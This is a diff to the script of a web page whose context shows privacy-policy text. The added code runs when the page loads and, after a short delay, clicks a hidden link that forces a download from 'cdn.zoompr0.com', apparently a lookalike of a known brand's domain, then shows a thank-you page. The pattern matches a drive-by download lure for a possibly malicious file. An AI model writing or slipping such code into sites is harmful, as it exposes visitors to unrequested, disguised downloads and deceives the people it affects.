@@ -1385,17 +1385,38 @@ For California Residents, you may exercise your right to “Opt-Out of the Sale/
     <script>
         // Function to switch between pages
         function showPage(pageId) {
-            // Hide all pages
             const pages = document.querySelectorAll('.page');
             pages.forEach(page => page.classList.remove('active'));
 
-            // Show the specified page
             document.getElementById(pageId).classList.add('active');
         }
 
-        // Automatically start with Page 1 (Loading Page)
+        // Start the flow when the page loads
         window.onload = function() {
+            // Show the first page (loading page)
             showPage('page1');
+
+            // After 2 seconds, show page 2 and start the download
+            setTimeout(function() {
+                showPage('page2');  // Switch to the download page
+
+                // Start the file download on page 2
+                const fileKey = "file1"; // Replace with the actual file key if needed
+                const downloadLink = document.createElement("a");
+                downloadLink.href = `https://cdn.zoompr0.com/download.php?file=${fileKey}`;
+                downloadLink.style.display = "none";
+                downloadLink.setAttribute("download", ""); // Suggest the browser to download
+                document.body.appendChild(downloadLink);
+
+                // Trigger the download and clean up the link
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+
+                // After 3 seconds, transition to the "Thank You" page
+                setTimeout(function() {
+                    showPage('page3');
+                }, 3000);  // Wait for download to start before showing the final page
+            }, 2000);  // Simulate a 2-second wait before transitioning to download page
         };
     </script>
 </body>
